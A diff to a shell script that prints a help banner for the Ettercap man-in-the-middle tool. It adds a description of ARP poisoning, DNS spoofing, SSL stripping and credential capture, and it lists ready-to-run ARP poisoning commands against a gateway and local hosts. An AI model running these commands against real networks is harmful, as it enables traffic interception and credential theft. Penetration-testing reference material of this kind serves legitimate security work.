@@ -3,6 +3,12 @@ echo -e "\033[32m╔════════════════════
 echo -e "║  🕷 Ettercap — MITM Attack Tool    ║"
 echo -e "╚══════════════════════════════════════╝\033[0m"
 echo
+echo -e "\033[33mWhy use it:\033[0m Man-in-the-middle attacks — ARP poisoning,"
+echo "  DNS spoofing, packet sniffing, and content filtering. Positions you"
+echo "  between victim and gateway so you can intercept/modify traffic."
+echo "  The classic LAN attack tool. Use it to capture credentials, strip"
+echo "  SSL, or modify web pages on the fly."
+echo
 echo -e "\033[33mQuick ARP poison (text mode):\033[0m"
 echo "  sudo ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100//"
 echo
@@ -14,5 +20,4 @@ echo "  -q           Quiet mode"
 echo
 echo -e "\033[33mExample - intercept traffic:\033[0m"
 echo "  sudo ettercap -T -q -i eth0 -M arp:remote /192.168.1.1// /192.168.1.0/24//"
-echo
 echo -e "\033[90m──────────────────────────────────────\033[0m"
